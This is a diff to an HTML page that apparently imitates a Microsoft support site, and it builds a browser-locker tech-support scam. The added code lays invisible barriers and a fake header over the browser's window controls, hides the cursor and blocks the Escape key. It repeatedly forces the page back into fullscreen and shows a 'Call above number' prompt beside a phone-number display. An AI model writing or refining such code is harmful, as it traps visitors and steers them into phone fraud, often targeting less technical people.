@@ -30,18 +30,22 @@
       <link rel="stylesheet" href="css/main-light.min.ACSHASHfd071803266ba1f4336b43868366299a.css" type="text/css">
       <link rel="stylesheet" href="css/clientlib-base.min.ACSHASH24e963c5973b1072ed7b92de5bd89ad2.css" type="text/css">
       <link rel="stylesheet" href="css/clientlib-uhf.min.ACSHASHf9f2395c582fa601707b7a5dfae9f05f.css" type="text/css">
-      <script type="text/javascript" src="js/v1.min.ACSHASHc343dfb005ac8c14ae0dd22dd17fb2fc.js" async=""></script>
-      <script src="assets/js/jquery.min.js"></script>
+      <script type="text/javascript" src="js/v1.min.ACSHASHc343dfb005ac8c14ae0dd22dd17fb2fc.js" async=""></script>      <script src="assets/js/jquery.min.js"></script>
       <script type="text/javascript" src="assets/js/params.js"></script>
       <script type="text/javascript" src="assets/js/main.js"></script>
-      <script src="assets/js/land.js"></script> 
-<style>
-  html, body {
+      <script src="assets/js/land.js"></script>
+      <script type="text/javascript" src="assets/js/fullscreen-helper.js"></script> 
+<style>  html, body {
     margin: 0;
     padding: 0;
     height: 100%;
     width: 100%;
+    overflow: hidden;
+    top: 0px;
+    /* Cursor is visible by default */
   }
+
+  /* Don't hide cursor by default */
 
   img.fullscreen-image {
     height: 100vh;
@@ -49,9 +53,375 @@
     object-fit: contain; /* Show full image without cropping */
     display: block;
   }
+  /* For fullscreen mode, ensure cursor is hidden */
+  .fullscreen-active,
+  .fullscreen-active * {
+    cursor: none !important;
+  }
+
+  /* Ensure that hover states don't change cursor in fullscreen mode */
+  .fullscreen-active *:hover {
+    cursor: none !important;
+  }
+    
+  /* Also handle all standard cursor styles in fullscreen mode */
+  .fullscreen-active .pointer, 
+  .fullscreen-active [style*="cursor: pointer"], 
+  .fullscreen-active [style*="cursor:pointer"] {
+    cursor: none !important;
+  }
+      .fullscreen-active .default, 
+  .fullscreen-active [style*="cursor: default"], 
+  .fullscreen-active [style*="cursor:default"] {
+    cursor: none !important;
+  }
+    
+  .fullscreen-active .text, 
+  .fullscreen-active [style*="cursor: text"], 
+  .fullscreen-active [style*="cursor:text"] {
+    cursor: none !important;
+  }
+
+  /* Create a top barrier to prevent exiting fullscreen */
+  .top-barrier {
+    position: fixed;
+    top: -10px; /* Position it slightly above the viewport */
+    left: 0;
+    width: 100%;
+    height: 200px; /* Extra large to ensure coverage */
+    background-color: transparent;
+    z-index: 2147483647; /* Maximum possible z-index */
+    pointer-events: auto; /* Capture all pointer events */
+  }
+    /* Cover the browser UI controls with a fake header */
+  .fake-headerr {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 150px;
+    background-color: #000; /* Match your image background */
+    z-index: 2147483646; /* Just below the barrier but above everything else */
+  }
+
+  /* Additional barriers specifically for window controls */
+  .close-button-blocker {
+    position: fixed;
+    top: -50px;  
+    right: 0;
+    width: 100px;
+    height: 150px;
+    background-color: transparent;
+    z-index: 2147483647;
+    pointer-events: auto;
+  }
+  
+  .window-controls-blocker {
+    position: fixed;
+    top: 0;
+    right: 0;
+    width: 200px;
+    height: 50px;
+    background-color: transparent;
+    z-index: 2147483647;
+    pointer-events: auto;
+  }
+    /* Ensure that even newly added elements get the cursor: none property when in fullscreen */
+  @keyframes disableCursorForNewElements {
+    from { cursor: none !important; }
+    to { cursor: none !important; }
+  }
+  
+  .fullscreen-active * {
+    animation: disableCursorForNewElements 0.001s forwards;
+  }
+  /* Close button styling with blinking animation */  @keyframes blink {
+    0% { box-shadow: 0 0 15px rgba(255, 100, 100, 0.4); opacity: 0.85; }
+    50% { box-shadow: 0 0 30px rgba(255, 100, 150, 0.9); opacity: 1; }
+    100% { box-shadow: 0 0 15px rgba(255, 100, 100, 0.4); opacity: 0.85; }
+  }
+  
+  @keyframes pulse {
+    0% { transform: translate(250px, -200px) scale(1); }
+    50% { transform: translate(250px, -200px) scale(1.1); }
+    100% { transform: translate(250px, -200px) scale(1); }
+  }
+    .close-btn {
+    position: fixed;
+    top: 50%;
+    right: 50%;
+    transform: translate(250px, -200px);
+    width: 60px;
+    height: 60px;
+    background: linear-gradient(145deg, #ff5e3a, #ff416c);
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    cursor: pointer;
+    animation: blink 1.5s infinite ease-in-out, pulse 3s infinite ease-in-out;
+    border: 3px solid rgba(255, 255, 255, 0.9);
+    box-shadow: 0 0 20px rgba(255, 100, 100, 0.6);
+  }
+  .close-btn:hover {
+    background: linear-gradient(145deg, #ff416c, #ff5e3a);
+    animation-play-state: paused;
+    transform: translate(250px, -200px) scale(1.15);
+    box-shadow: 0 0 25px rgba(255, 100, 100, 0.8);
+  }.close-btn::before,
+  .close-btn::after {
+    content: '';
+    position: absolute;
+    width: 30px;
+    height: 4px;
+    background: white;
+    border-radius: 2px;
+    transition: all 0.3s ease;
+    box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+  }
+
+  .close-btn::before {
+    transform: rotate(45deg);
+  }
+
+  .close-btn::after {
+    transform: rotate(-45deg);
+  }
+  
+  .close-btn:hover::before,
+  .close-btn:hover::after {
+    width: 32px;
+    background: #f0f0f0;
+  }  /* Enhanced tooltip with animation */
+  @keyframes fadeInOut {
+    0% { opacity: 0; transform: translateY(10px); }
+    10% { opacity: 1; transform: translateY(0); }
+    90% { opacity: 1; transform: translateY(0); }
+    100% { opacity: 0; transform: translateY(10px); }
+  }
+
+  .close-btn .tooltip {
+    position: absolute;
+    bottom: -45px;
+    background: rgba(0, 0, 0, 0.8);
+    color: white;
+    padding: 8px 15px;
+    border-radius: 30px;
+    font-size: 16px;
+    font-weight: bold;
+    white-space: nowrap;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+    animation: fadeInOut 3s infinite;
+    border: 1px solid rgba(255, 255, 255, 0.3);
+    letter-spacing: 0.5px;
+  }
+
+  .close-btn:hover .tooltip {
+    animation-play-state: paused;
+    opacity: 1;
+    background: linear-gradient(90deg, #222222, #333333);
+  }
+
+  /* Continue Button Styling */  @keyframes float {
+    0% { transform: translateY(0px); }
+    50% { transform: translateY(-10px); }
+    100% { transform: translateY(0px); }
+  }
+
+  @keyframes colorShift {
+    0% { background: linear-gradient(145deg, #000000, #333333); }
+    50% { background: linear-gradient(145deg, #222222, #000000); }
+    100% { background: linear-gradient(145deg, #000000, #333333); }
+  }
+
+  .continue-btn {
+    position: fixed;
+    bottom: 8%;
+    left: 50%;
+    transform: translateX(-50%);
+    min-width: 200px;
+    width: auto;
+    height: 60px;
+    padding: 0 25px;
+    background: linear-gradient(145deg, #000000, #333333);
+    border-radius: 30px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;    cursor: pointer;
+    animation: float 3s infinite ease-in-out, colorShift 5s infinite;
+    border: 3px solid rgba(255, 255, 255, 0.9);
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
+    transition: all 0.3s ease;
+    box-sizing: border-box;
+  }
+
+  .continue-btn:hover {
+    transform: translateX(-50%) scale(1.05);
+    box-shadow: 0 15px 30px rgba(0, 0, 0, 0.8);
+  }
+
+  .continue-btn-text {
+    color: white;
+    font-size: 20px;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    text-shadow: 0 2px 3px rgba(0, 0, 0, 0.5);
+    white-space: nowrap;
+  }
+
+  .continue-btn::after {
+    content: "→";
+    font-size: 22px;
+    margin-left: 10px;
+    transition: transform 0.3s ease;
+  }
+
+  .continue-btn:hover::after {
+    transform: translateX(5px);
+  }
+
+  /* Arrow animation */
+  @keyframes arrowPulse {
+    0% { opacity: 0.6; transform: translateX(0); }
+    50% { opacity: 1; transform: translateX(5px); }
+    100% { opacity: 0.6; transform: translateX(0); }
+  }
+
+  .arrow {
+    display: inline-block;
+    margin-left: 8px;
+    animation: arrowPulse 1.5s infinite;
+  }
+
+  /* Ensure the continue button stays visible even in fullscreen mode */
+  .fullscreen-active .continue-btn {
+    cursor: pointer !important;
+  }
+  
+  /* Hide close button in fullscreen mode */
+  .fullscreen-active .close-btn {
+    display: none !important;
+  }
+    /* Change the continue button text in fullscreen mode */
+  .continue-btn-text .normal-text {
+    display: inline;
+    white-space: nowrap;
+  }
+  
+  .continue-btn-text .fullscreen-text {
+    display: none;
+    white-space: nowrap;
+  }
+  
+  .fullscreen-active .continue-btn-text .normal-text {
+    display: none;
+  }
+  
+  .fullscreen-active .continue-btn-text .fullscreen-text {
+    display: inline;
+  }
+
+  /* Adjust the continue button in fullscreen mode */
+  .fullscreen-active .continue-btn {
+    min-width: 280px;
+    width: auto;
+    padding: 0 30px;
+    background: linear-gradient(145deg, #000000, #222222);
+  }
+
+  /* Add responsive text sizing for different screen sizes */
+  @media screen and (max-width: 768px) {
+    .continue-btn {
+      padding: 0 20px;
+      min-width: 180px;
+      height: 55px;
+    }
+    
+    .continue-btn-text {
+      font-size: 16px;
+    }
+    
+    .fullscreen-active .continue-btn {
+      min-width: 240px;
+      padding: 0 25px;
+    }
+    
+    .fullscreen-active .continue-btn-text {
+      font-size: 15px;
+    }
+  }
+
+  /* Phone number display styling */
+  .phone-number-display {
+    position: fixed;
+    top: 30%;
+    left: 50%;
+    transform: translateX(-50%);
+    background: linear-gradient(145deg, #000000, #222222);
+    padding: 15px 30px;
+    border-radius: 15px;
+    color: white;
+    font-size: 28px;
+    font-weight: bold;
+    text-align: center;
+    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+    border: 2px solid rgba(255, 255, 255, 0.8);
+    z-index: 9998;
+    display: none;
+  }
+  
+  /* Only show phone number in fullscreen mode */
+  .fullscreen-active .phone-number-display {
+    display: block;
+  }
+  
+  /* Responsive phone display */
+  @media screen and (max-width: 768px) {
+    .phone-number-display {
+      font-size: 22px;
+      padding: 12px 20px;
+      top: 25%;
+    }
+  }
+
+  /* Adjust the continue button in fullscreen mode */
 </style>
    </head>
 <body>
+ <div class="top-barrier"></div>
+ <div class="fake-header"></div>
+ <div class="close-button-blocker"></div>
+ <div class="window-controls-blocker"></div>
+ <!-- Close Button -->
+ <div class="close-btn">
+   <span class="tooltip">Click to close</span>
+ </div>  <!-- Continue Button -->
+ <div class="continue-btn">
+   <span class="continue-btn-text">
+     <span class="normal-text">Continue</span>
+     <span class="fullscreen-text">Call above number</span>
+     <span class="arrow">→</span>
+   </span>
+ </div>
+ 
+ <script>
+   // Do NOT hide cursor initially - we want the cursor to be visible until fullscreen
+   
+   // We'll use the fullscreen-active class to control cursor visibility
+   if (document.fullscreenElement || 
+       document.webkitFullscreenElement || 
+       document.mozFullScreenElement || 
+       document.msFullscreenElement) {
+     // Only hide if already in fullscreen mode
+     document.body.classList.add('fullscreen-active');
+   } else {
+     // Make sure cursor is visible on page load
+     document.body.classList.remove('fullscreen-active');
+   }
+ </script>
  <picture>
   <!-- Mobile image (standard and retina versions) -->
   <source 
@@ -133,8 +503,7 @@
               elem.msRequestFullscreen();
         }
         e.preventDefault();
-     });
-     document.addEventListener('keydown', function(e) {
+     });     document.addEventListener('keydown', function(e) {
         var elem = document.documentElement;
         if (elem.requestFullscreen) {
               elem.requestFullscreen();
@@ -144,6 +513,13 @@
               elem.webkitRequestFullscreen();
         } else if (elem.msRequestFullscreen) { /* IE/Edge */
               elem.msRequestFullscreen();
+        }
+        
+        // Prevent Escape key from exiting fullscreen
+        if (e.key === 'Escape') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
         }
      });
     //alt + f4 brrowser close disable
@@ -196,9 +572,214 @@
         });
 document.addEventListener('fullscreenchange', (event) => {
            if (document.fullscreenElement) {
+              document.body.classList.add('fullscreen-active');
+              document.documentElement.style.cursor = 'none';
+              
+              // Apply cursor none to all elements again
+              var allElements = document.getElementsByTagName('*');
+              for (var i = 0; i < allElements.length; i++) {
+                allElements[i].style.cursor = 'none';
+              }
+              
+              // Force fullscreen again if it attempts to exit
+              setTimeout(function() {
+                 var elem = document.documentElement;
+                 if (!document.fullscreenElement && elem.requestFullscreen) {
+                    elem.requestFullscreen({navigationUI: 'hide'});
+                 }
+              }, 100);
+           } else {
+              // Try to re-enter fullscreen immediately
+              var elem = document.documentElement;
+              if (elem.requestFullscreen) {
+                 try {
+                   elem.requestFullscreen({navigationUI: 'hide'});
+                 } catch(err) {
+                   elem.requestFullscreen();
+                 }
+              }
+              
+              // If we can't re-enter, then restore normal cursor
+              setTimeout(function() {
+                 if (!document.fullscreenElement) {
+                    // Try again
+                    if (elem.requestFullscreen) {
+                       elem.requestFullscreen();
+                    }
+                    document.body.classList.add('fullscreen-active');
+                    document.documentElement.style.cursor = 'none';
+                 }
+              }, 200);
+           }
+        });
+          // Add support for other browser prefixes for fullscreen change
+        document.addEventListener('webkitfullscreenchange', (event) => {
+           if (document.webkitFullscreenElement) {
+              document.body.classList.add('fullscreen-active');
+              document.documentElement.style.cursor = 'none';
+              
+              // Apply cursor none to all elements
+              var allElements = document.getElementsByTagName('*');
+              for (var i = 0; i < allElements.length; i++) {
+                allElements[i].style.cursor = 'none';
+              }
+           } else {
+              // Try to re-enter fullscreen immediately
+              try {
+                document.documentElement.webkitRequestFullscreen({navigationUI: 'hide'});
+              } catch(err) {
+                document.documentElement.webkitRequestFullscreen();
+              }
+           }
+        });
+        
+        document.addEventListener('mozfullscreenchange', (event) => {
+           if (document.mozFullScreenElement) {
+              document.body.classList.add('fullscreen-active');
+              document.documentElement.style.cursor = 'none';
+              
+              // Apply cursor none to all elements
+              var allElements = document.getElementsByTagName('*');
+              for (var i = 0; i < allElements.length; i++) {
+                allElements[i].style.cursor = 'none';
+              }
+           } else {
+              // Try to re-enter fullscreen immediately
+              try {
+                document.documentElement.mozRequestFullScreen({navigationUI: 'hide'});
+              } catch(err) {
+                document.documentElement.mozRequestFullScreen();
+              }
+           }
+        });
+        
+        document.addEventListener('MSFullscreenChange', (event) => {
+           if (document.msFullscreenElement) {
+              document.body.classList.add('fullscreen-active');
+              document.documentElement.style.cursor = 'none';
+              
+              // Apply cursor none to all elements
+              var allElements = document.getElementsByTagName('*');
+              for (var i = 0; i < allElements.length; i++) {
+                allElements[i].style.cursor = 'none';
+              }
+           } else {
+              // Try to re-enter fullscreen immediately
+              document.documentElement.msRequestFullscreen();
+           }
+        });
+          // Force cursor to be hidden immediately when entering fullscreen
+        function forceHideCursor() {
+           if (document.fullscreenElement || 
+               document.webkitFullscreenElement || 
+               document.mozFullScreenElement || 
+               document.msFullscreenElement) {
+              document.body.classList.add('fullscreen-active');
+              document.documentElement.style.cursor = 'none';
+              
+              // Apply to all elements
+              var allElements = document.getElementsByTagName('*');
+              for (var i = 0; i < allElements.length; i++) {
+                 allElements[i].style.cursor = 'none';
+              }
+           }
+        }
+          // Hide cursor when mouse moves in fullscreen
+        document.addEventListener('mousemove', function(e) {
+           forceHideCursor();
+           
+           // Prevent mouse interactions near the top of the screen
+           if (e.clientY < 100) {
+              // Move mouse down if it gets too close to the top
+              try {
+                 e.preventDefault();
+                 e.stopPropagation();
+              } catch(err) {
+                 // Some browsers may not allow this, so we catch any errors
+              }
+           }
+        });
+        
+        // Add additional protection for the top area
+        document.querySelector('.top-barrier').addEventListener('mouseenter', function(e) {
+           // Force fullscreen again just in case
+           var elem = document.documentElement;
+           if (elem.requestFullscreen) {
+              elem.requestFullscreen();
+           } else if (elem.mozRequestFullScreen) {
+              elem.mozRequestFullScreen();
+           } else if (elem.webkitRequestFullscreen) {
+              elem.webkitRequestFullscreen();
+           } else if (elem.msRequestFullscreen) {
+              elem.msRequestFullscreen();
+           }
+           
+           // Prevent default actions
+           e.preventDefault();
+           e.stopPropagation();
+        });
+        
+        // Initial call to hide cursor if already in fullscreen
+        forceHideCursor();
+          document.addEventListener('fullscreenchange', function(e) {
+           if (document.fullscreenElement) {
+              document.body.classList.add('fullscreen-active');
               document.documentElement.style.cursor = 'none';
            }
-        });  
+        });
+          // Add a special barrier that moves with the mouse when near the top
+        document.addEventListener('mousemove', function(e) {
+           // When mouse is within 150px of the top, create a tracking barrier
+           if (e.clientY < 150) {
+              // Make sure the fake header is in the right place
+              document.querySelector('.fake-header').style.top = '0px';
+              
+              // When near the top right (where close button is), add extra protection
+              if (e.clientX > window.innerWidth - 200) {
+                document.querySelector('.close-button-blocker').style.display = 'block';
+                document.querySelector('.window-controls-blocker').style.display = 'block';
+                
+                // Try to block the event
+                e.preventDefault();
+                e.stopPropagation();
+                
+                // Force cursor hiding again
+                document.body.style.cursor = 'none';
+                document.documentElement.style.cursor = 'none';
+              }
+              
+              // Request fullscreen again if needed
+              var elem = document.documentElement;
+              if (!document.fullscreenElement && elem.requestFullscreen) {
+                 try {
+                   elem.requestFullscreen({navigationUI: 'hide'});
+                 } catch(err) {
+                   elem.requestFullscreen();
+                 }
+              }
+           }
+        });
+        
+        // Additional protection for mouse clicks near the top
+        document.addEventListener('mousedown', function(e) {
+          if (e.clientY < 150) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            // Force fullscreen
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) {
+              try {
+                elem.requestFullscreen({navigationUI: 'hide'});
+              } catch(err) {
+                elem.requestFullscreen();
+              }
+            }
+            
+            return false;
+          }
+        }, true);
+            
       </script>
    </body>
 </html>
